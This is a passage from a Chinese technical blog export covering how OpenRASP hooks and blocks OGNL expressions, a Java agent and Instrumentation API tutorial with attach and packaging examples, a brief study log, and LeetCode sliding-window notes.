java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkOgnlExpression</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">expression</span> <span class="operator">=</span> String.valueOf(object);</span><br><span class="line">        <span class="keyword">if</span> (expression.length() &gt;= Config.getConfig().getOgnlMinLength()) &#123;</span><br><span class="line">            HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">            params.put(<span class="string">&quot;expression&quot;</span>, expression);</span><br><span class="line">            HookHandler.doCheck(CheckParameter.Type.OGNL, params);</span><br><span class="line">            <span class="comment">//参数包括初始化时CheckParameter.TYPE枚举类，以及当前方法OgnlParser$topLevelExpression的参数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​CheckerManager.check根据当前类型Type.OGNL，从枚举映射CheckerManager.checkers中获取对应的V8AttackChecker，故调用js插件完成对参数的检测。如果符合匹配规则则返回block为true，调用handleBlock(parameter)抛出异常，完成攻击拦截。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /plugin/checker/CheckParameter.java：</span></span><br><span class="line">OGNL(<span class="string">&quot;ognl&quot;</span>, <span class="keyword">new</span> <span class="title class_">V8AttackChecker</span>(), <span class="number">1</span> &lt;&lt; <span class="number">10</span>)</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// /plugin/checker/CheckerManager.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(Type type, CheckParameter parameter)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> checkers.get(type).check(parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一段话总结"><a href="#一段话总结" class="headerlink" title="一段话总结"></a>一段话总结</h2><p>​ OpenRASP初始化时，先将CheckParameter中的Hook类添加到枚举映射checkers中，然后实例化类文件转换器CustomClassTransformer类，调用CustomClassTransformer$retransform，对Instrumentation已经加载的类hook。对hook点管理的初始化，是在CustomClassTransformer类实例化时，调用其addAnnotationHook，将所有需要的hook类添加到HashSet<AbstractClassHook> hooks。</p><p>​ OpenRASP通过CustomClassTransformer$transform拦截到类加载时，会遍历初始化得到的hooks中的所有hook类，判断是否匹配当前类，如果是则把一段代码插到当前类的指定方法。这段代码的作用是，当此类的目标方法被调用时，就会反射获取该类对应的AbstractClassHook实例，并反射调用该hook类的指定方法，完成相应检测逻辑。</p><p>​这段代码是通过javassit生成的，首先通过getInvokeStaticSrc生成代码字符串，再通过insertAfter将字符串插入到目标类的指定方法。代码的效果是反射调用对应hook类的检测方法，该检测方法先通过HookHandler.doCheck统一进行关于云控和负载的检查，再根据传入的类从枚举映射checkers中获取对应checker，执行相应检测逻辑。</p><p>​一般获取到的是V8AttackChecker，可以对传入参数进行检查，如果符合匹配规则则返回block，调用handleBlock(parameter)抛出异常，完成攻击拦截。用户可以实时修改js文件中的检测规则，通过V8执行js，从而OpenRASP具备热部署性能。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">一、OpenRASP 官方文档</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/</span></span><br><span class="line">二、浅谈RASP</span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/187415#h2-6</span></span><br><span class="line">三、OpenRASP学习笔记</span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/216886#h2-6</span></span><br><span class="line">四、Java底层防护 - OpenRASP核心源码浅析</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7005</span></span><br><span class="line">五、百度 OpenRASP 组成分析https:<span class="comment">//jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Agent</title>
      <link href="/2022/11/18/Java-Agent/"/>
      <url>/2022/11/18/Java-Agent/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>  Java agent是通过Java Instrumentation API（<em>java.lang.intrumentation</em>）开发出的agent程序，这种程序能够以代理的形式监控或修改JVM中运行的Java程序，主要提供了动态检查或修改字节码的特性。用来实现Java调试，监控，诊断的插件工具。</p><p>  Java agent程序启动后是和JVM运行在同一个进程，大多agent的工作形式是作为服务端接收来自客户端的请求，然后根据请求命令调用JVMTI的相关接口再返回结果。</p><p>  JVMTI（JVM Tool Interface）是 Java 虚拟机所提供的 native 编程接口，可以用来开发并监控虚拟机，可以查看JVM内部的状态，并控制JVM应用程序的执行。即JVM本身就实现了对其自身状态检查的方法，agent程序只是在上层调用这些接口。JDK 5以前的agent程序，是用C&#x2F;C++编写的动态链接库，而JDK 5以后引入的Instrumentation机制，使得agent程序可以直接用Java代码编写。</p><h2 id="二、Instrument机制"><a href="#二、Instrument机制" class="headerlink" title="二、Instrument机制"></a>二、Instrument机制</h2><p>  Java agent程序有两种方式整合到目标应用（也就是目标JVM，目标进程），一种是main方法启动前执行，另一种是main方法内部通过attach来进行加载。为便于描述，称前者为Agent模式，称后者为Attach模式。</p><p>  JVM启动时，会先执行agent程序的premain方法，大部分类加载都会通过该方法，注意：是大部分，不是所有。遗漏的主要是系统类，因为很多系统类先于 agent 执行，而用户类的加载肯定是会被拦截的。也就是说，这个方法是在目标应用的main方法启动前拦截大部分类的加载活动，既然可以拦截类的加载，就可以结合第三方的字节码编译工具，比如ASM，javassist，cglib等等来改写实现类。</p><h3 id="Agent模式（目标应用main方法启动前）"><a href="#Agent模式（目标应用main方法启动前）" class="headerlink" title="Agent模式（目标应用main方法启动前）"></a>Agent模式（目标应用main方法启动前）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -javaagent:/path/to/javaagent.jar -jar application.jar</span><br><span class="line">    <span class="comment">//-javaagent，后面跟着被打包成jar包的Java agent程序路径。</span></span><br><span class="line">java -javaagent:agent1.jar -javaagent:agent2.jar -jar application.jar</span><br><span class="line">    <span class="comment">//一个java程序中-javaagent参数的个数是没有限制的，所以可以添加任意多个javaagent。所有的java agent会按照你定义的顺序执行，例如：</span></span><br></pre></td></tr></table></figure><p>  开发Agent模式的Java agent程序时，jar包内容有一定规范：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>jar包中的MANIFEST.MF 文件必须指定 Premain-Class 项</span><br><span class="line"><span class="number">2.</span>Premain-Class 指定的那个类必须实现 premain() 方法</span><br></pre></td></tr></table></figure><p>  Premain-Class项指定的代理类需要实现premain方法，当agent整合到目标应用时，会先运行premain方法再执行目标的main方法。下面两种premain方法带Instrumentation参数的会被优先加载，不存在时才加载只有String参数的：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//agentArgs是一个字符串，会随着jvm启动设置的参数得到</span></span><br><span class="line"><span class="comment">//inst就是我们需要的Instrumention实例了，由JVM传入。我们可以拿到这个实例后进行各种操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span>; </span><br></pre></td></tr></table></figure><h3 id="Attach模式（目标应用之外，用一个attach应用将javaagent-jar注入到目标应用中）"><a href="#Attach模式（目标应用之外，用一个attach应用将javaagent-jar注入到目标应用中）" class="headerlink" title="Attach模式（目标应用之外，用一个attach应用将javaagent.jar注入到目标应用中）"></a>Attach模式（目标应用之外，用一个attach应用将javaagent.jar注入到目标应用中）</h3><p>  与Agent模式直接通过Java命令参数启动不同，Attach模式需要另外启动一个attach应用。</p><p>  在Attach模式整合agent程序的过程中，需要用到com.sun.tools.attach包下VirtualMachine类和VirtualMachineDescriptor类，下面是attach应用的一般实现逻辑。首先通过VirtualMachine$List方法获取系统内的所有jvm进程，再遍历jvm描述符，判断主类的类名是否为目标类，如果是的话，获取jvm进程pid，并通过VirtualMachine将agent.jar整合到目标应用的jvm上。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//attach模式的实现，底层调用如下，即通过发送load命令来加载</span></span><br><span class="line"><span class="comment">//InputStream in = this.execute(&quot;load&quot;, agentLibrary, isAbsolute ? &quot;true&quot; : &quot;false&quot;, options);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main running&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vir : list) &#123;</span><br><span class="line">            System.out.println(vir.displayName());<span class="comment">//打印JVM加载类名</span></span><br><span class="line">            <span class="keyword">if</span> (vir.displayName().endsWith(<span class="string">&quot;com.test.test&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">attach</span> <span class="operator">=</span> VirtualMachine.attach(vir.id());   <span class="comment">//attach注入一个jvm id注入进去</span></span><br><span class="line">                attach.loadAgent(<span class="string">&quot;out\\Agent1-1.0-SNAPSHOT.jar&quot;</span>);<span class="comment">//加载agent</span></span><br><span class="line">                attach.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  和前面的permain类似，代理类需要定义一个agentmain方法的类，同样是带Instrumentation参数的优先级更高。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure><h3 id="Instrumentation接口和ClassFileTransformer接口的实现"><a href="#Instrumentation接口和ClassFileTransformer接口的实现" class="headerlink" title="Instrumentation接口和ClassFileTransformer接口的实现"></a>Instrumentation接口和ClassFileTransformer接口的实现</h3><p>  Agent模式或Attach模式只是把agent程序整合到目标应用的不同方式，agent程序的内容则是相同的，都是通过<em>java.lang.intrumentation</em>包中的Instrumentation接口和ClassFileTransformer接口实现，实现逻辑如下，区别仅在代理类分别实现了premain方法和agentmain方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="comment">//public static void agentmain(String agentArgs, Instrumentation instrumentation) &#123;  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentArgs&quot;</span>+agentArgs);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);<span class="comment">//调用addTransformer添加一个Transformer</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> ------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;premain load class&quot;</span>+className); <span class="comment">//打印加载的类</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  Instrumentation接口和ClassFileTransformer接口更多的源码介绍记录在附录。</p><p>  总的来说，就是通过premain或agentmain表明agent程序的入口，JVM传入的instrumentation实例，主要用来设置类文件转换器。而ClassFileTransformer接口就是类文件转换器，我们通过addTransformer方法向JVM注册自定义的ClassFileTransformer，当有新的类被JVM加载时，JVM会自动回调我们定义的转换器的transform方法。</p><p>  回过头来再想想，JVMTI是基于事件驱动的，JVM每执行到一定的逻辑（比如新的类加载）就会调用一些事件的回调接口（如果有的话），这些接口可以供开发者去扩展自己的逻辑。JVM回调的是JVMTI接口，这些接口本身就是暴露出来供用户扩展，而继续往上就是我们实现的Instrumentation接口和ClassFileTransformer接口。JVMTI和java.lang.intrumentation提供的接口可以被理解为回调函数，并完成不同语言的交互问题。当我们实现agent程序时，即为JVM实现了回调函数，这些回调函数主要被用来修改字节码。</p><p>  附录中有大佬描述的JVM ClassFileLoadHook回调实现。</p><h2 id="三、打包"><a href="#三、打包" class="headerlink" title="三、打包"></a>三、打包</h2><p>在SRC\META-INF\MANIFEST.MF文件中添加内容</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line">Premain-Class: com.bmsk.App</span><br></pre></td></tr></table></figure><p>在maven项目的pom.xml中配置打包插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.0.2&lt;/version&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">        &lt;archive&gt;</span><br><span class="line">            &lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span><br><span class="line">            &lt;manifest&gt;</span><br><span class="line">                &lt;addClasspath&gt;true&lt;/addClasspath&gt;</span><br><span class="line">            &lt;/manifest&gt;</span><br><span class="line">            &lt;manifestEntries&gt;</span><br><span class="line">                &lt;Premain-Class&gt;com.bmsk.App&lt;/Premain-Class&gt;</span><br><span class="line">                &lt;Agent-Class&gt;com.bmsk.App&lt;/Agent-Class&gt;</span><br><span class="line">                &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;</span><br><span class="line">                &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;</span><br><span class="line">            &lt;/manifestEntries&gt;</span><br><span class="line">        &lt;/archive&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p>命令行输入mvn clean -&gt; mvn package，或者直接点击maven插件的package按钮。</p><h2 id="四、OpenRASP和Java-Agent"><a href="#四、OpenRASP和Java-Agent" class="headerlink" title="四、OpenRASP和Java Agent"></a>四、OpenRASP和Java Agent</h2><p>这里以目前对Java Agent的理解，讲一讲对Open RASP的疑问吧：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>agent程序是在类加载时修改字节码，怎么样实现对方法调用的监控？是修改字节码时修改了目标类的方法，使得该方法被调用时能传递信息给外部程序记录，云控就是在这个位置吗？还是有方法调用相关的JVMTI事件，从而能挂上方法调用相关的回调接口？</span><br><span class="line"><span class="number">2.</span>云控怎样实现和优化，云控在OpenRASP的哪些位置出现，是否灵活？</span><br><span class="line"><span class="number">2.</span>agent程序和JavaScript执行引擎是怎样相互配合的，热补丁能否通过JavaScript以外其他方式实现？</span><br></pre></td></tr></table></figure><p>具体的答案还需要以后慢慢探索。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">一、Java JVMTI和Instrumention机制介绍</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/eff047d4480a</span></span><br><span class="line">二、Java 安全之Java Agent</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14086165.html</span></span><br><span class="line">三、java agent简介</span><br><span class="line">https:<span class="comment">//blog.csdn.net/a724888/article/details/127004488</span></span><br><span class="line">四、javaagent使用指南</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/rickiyang/p/11368932.html</span></span><br><span class="line">五、Instrumentation接口详解</span><br><span class="line">https:<span class="comment">//www.bbsmax.com/A/x9J2LvLgd6/</span></span><br><span class="line">六、一种JDBC Attack的新方式</span><br><span class="line">    http:<span class="comment">//tttang.com/archive/1831/</span></span><br></pre></td></tr></table></figure><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="Instrumentation接口源码"><a href="#Instrumentation接口源码" class="headerlink" title="Instrumentation接口源码"></a>Instrumentation接口源码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//添加ClassFileTransformer</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加ClassFileTransformer</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//移除ClassFileTransformer</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否可以被重新定义</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRetransformClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重新定义Class文件</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否可以修改Class文件</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取所有加载的Class</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取指定类加载器已经初始化的类</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取某个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加指定jar包到启动类加载器检索路径</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加指定jar包到系统类加载检索路径</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//本地方法是否支持前缀</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isNativeMethodPrefixSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置本地方法前缀，一般用于按前缀做匹配操作</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ClassFileTransformer接口源码"><a href="#ClassFileTransformer接口源码" class="headerlink" title="ClassFileTransformer接口源码"></a>ClassFileTransformer接口源码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//改变指定类的Class文件，返回修改后的字节码数组。agent程序通过定义类实现该接口，自定义实现transform，修改字节码。</span></span><br><span class="line">   <span class="comment">//传入内容包括类名className,类加载器loader，字节码数组classfileBuffer等</span></span><br><span class="line">   <span class="comment">//我们可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后我们将新的类字节码返回给JVM，JVM会验证类和相应的修改是否合法，如果符合类加载要求JVM会加载我们修改后的类字节码。</span></span><br><span class="line">    <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">        ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ClassFileLoadHook回调实现"><a href="#ClassFileLoadHook回调实现" class="headerlink" title="ClassFileLoadHook回调实现"></a>ClassFileLoadHook回调实现</h3><p>  Instrument 就是一种 JVMTIAgent，它实现了Agent_OnLoad和Agent_OnAttach两个方法，也就是在使用时，Instrument既可以在启动时加载，也可以再运行时加动态加载。</p><p>  启动时加载和运行时加载都是监听同一个JVMTI事件，那就是ClassFileLoadHook，这个是类加载的事件，在读取类文件字节码之后回调用的，这样就可以对字节码进行修改操作。</p><p>  在JVM加载类文件时，执行回调，加载Instrument agent，创建Instrumentation接口的实例并且执行premain方法，premain方法中注册自定义的ClassFileTransformer来对字节码文件进行操作，这个就是在加载时进行字节码增强的过程。</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习日志</title>
      <link href="/2022/11/14/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
      <url>/2022/11/14/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="学习日志"><a href="#学习日志" class="headerlink" title="学习日志"></a>学习日志</h1><h2 id="2022年12月19日-12月25日"><a href="#2022年12月19日-12月25日" class="headerlink" title="2022年12月19日-12月25日"></a>2022年12月19日-12月25日</h2><p>1.完成OpenRASP服务端伪造请求漏洞和XXE漏洞。</p><p>2.完成ICDCS2020-Deep数据集完成工作复现；</p><p>3.完成LeetCode每日一题十四道；</p><h2 id="2022年12月26日-1月1日"><a href="#2022年12月26日-1月1日" class="headerlink" title="2022年12月26日-1月1日"></a>2022年12月26日-1月1日</h2><ol><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>剑指offer 专项突破</title>
      <link href="/2022/11/14/%E5%89%91%E6%8C%87offer-%E4%B8%93%E9%A1%B9%E7%AA%81%E7%A0%B4/"/>
      <url>/2022/11/14/%E5%89%91%E6%8C%87offer-%E4%B8%93%E9%A1%B9%E7%AA%81%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="剑指Offer专项突破版"><a href="#剑指Offer专项突破版" class="headerlink" title="剑指Offer专项突破版"></a>剑指Offer专项突破版</h1><h2 id="第三章、字符串"><a href="#第三章、字符串" class="headerlink" title="第三章、字符串"></a>第三章、字符串</h2><h3 id="014-字符串中的变位词-567、8月14日"><a href="#014-字符串中的变位词-567、8月14日" class="headerlink" title="014.字符串中的变位词 (567、8月14日)"></a>014.字符串中的变位词 (567、8月14日)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：将字符串s1的各种变位词罗列出来，遍历变位词列表，调用某操作String类的API判断是否为子串。</span><br><span class="line">  a.给出子串位置api：s1.indexOf(s2);  </span><br><span class="line">  b.输出字符串的全排列：这是一个典型的回溯过程，每次先将字符串最左边位置与后面其他位置替换，再将左端位置右移一位，返回后则将最左边位置和那个其他位置替换出来，这样每次递进时后面的字符都挨个做当前最左端位置。</span><br><span class="line">      </span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：双指针+hash表。使用hash表记录s2中字符对应位置加<span class="number">1</span>，使用双指针在s1中维护一个和s2长度一致的子串，遍历双指针维护的子串时，将hash表对应字符位置减<span class="number">1</span>，当前子串遍历完毕时hash表全部值为<span class="number">0</span>则说明是变位词。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：两个hashmap比较，一个是s1的词频，另一个是s2的滑动窗口。每次移动只在滑动窗口的hashmap上改变两端，左端字符减一，右端字符加一，再进行两个hashmap的比较，这样就不需要在滑动窗口内部进行遍历。</span><br><span class="line">      </span><br><span class="line"><span class="number">4.</span>HashMap.equals作用于基本数据类型是能实现map的直接整体比较的。观察源码后发现，map1.equals通过entrySet().iterator()这种方式遍历了map1，判断了map2是否含有相同的键m.containsKey(key)，并判断键值是否相等value.equals(m.get(key))。因此，只有value类不是基本数据类型而是自定义类时，重写了equals和hashcode方法，才需要注意这种整体map调用equals是否合理。</span><br></pre></td></tr></table></figure><h3 id="015-字符串中的所有变位词-438、8月15日"><a href="#015-字符串中的所有变位词-438、8月15日" class="headerlink" title="015.字符串中的所有变位词(438、8月15日)"></a>015.字符串中的所有变位词(438、8月15日)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：思路同题目<span class="number">14</span>中的思路<span class="number">2</span>，实现两个hashMap比较，将<span class="keyword">return</span> <span class="literal">true</span>替换为result.add(i-p.length()+<span class="number">1</span>)，即窗口左端。</span><br><span class="line"><span class="number">2.</span>变位词题目思路关键：滑动窗口只改变两端词频+双指针实现滑动窗口，hash表或数组实现窗口内词频统计。</span><br></pre></td></tr></table></figure><h3 id="016-不含重复字符的最长连续子字符串-3、8月15日"><a href="#016-不含重复字符的最长连续子字符串-3、8月15日" class="headerlink" title="016.不含重复字符的最长连续子字符串(3、8月15日)"></a>016.不含重复字符的最长连续子字符串(3、8月15日)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题在<span class="number">7</span>月<span class="number">31</span>日做过，这次做看了下以前的笔记。现在记录的更简单些。</span><br><span class="line">    a.做法是维护一个HashMap&lt;Character,Integer&gt;，记录字符和它的上次出现位置；</span><br><span class="line">    b.向右滑动窗口时，遇到重复字符，就调整窗口的左端，保证窗口左端在重复字符上次出现位置的右边；由于可能窗口左端已经被其他重复字符更新，所以会出现在本来就在本重复字符上次位置右边的情况；</span><br><span class="line">        left = Math.max(left,hashMap.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">    c.滑动窗口中是不含重复字符的子串，即题目需求，就是在向右滑动过程中找到最大的滑动窗口；</span><br><span class="line"><span class="number">2.</span>滑动窗口的感觉：每次滑动只有开销很小的改动。</span><br></pre></td></tr></table></figure><h3 id="017-含有所有字符的最短字符串（76、8月15日、20日）"><a href="#017-含有所有字符的最短字符串（76、8月15日、20日）" class="headerlink" title="017.含有所有字符的最短字符串（76、8月15日、20日）"></a>017.含有所有字符的最短字符串（76、8月15日、20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：因为是求最短字符串且只返回一个，就将外层循环设置为字符串长度，内层循环设置为起始位置。和变位词类似，先用hashMap记录标准t字符串的词频情况，每次遍历一个滑动窗口时，就将标准t的hashMap拷贝一份tempMap，tempMap减去窗口内标准字符次数，全部小于<span class="number">0</span>则为“含所有字符的最短字符串”。因为需要遍历滑动窗口内部，开销很大，所以在测试最后<span class="number">3</span>个测试用例时，出现了超时。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> L=t.length();L&lt;=s.length();L++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i+L-<span class="number">1</span>&lt;s.length();i++)&#123;</span><br><span class="line"><span class="number">2.</span>我的想法<span class="number">2</span>：因为当外层循环确定滑动窗口大小L时，滑动窗口的移动只是改变两端字符的词频，因此不需要遍历滑动窗口改变tempMap，只需要关注两端造成的滑动窗口的词频改变，下一次移动前，计算滑动窗口hashMapS和标准t的hashMap的包含关系即可。但是，因为标准t字符串的长度可能很大，计算包含关系时，遍历标准t的hashMap造成巨大开销，在倒数第<span class="number">2</span>个测试用例上出现超时。</span><br><span class="line"><span class="number">3.</span>我的想法<span 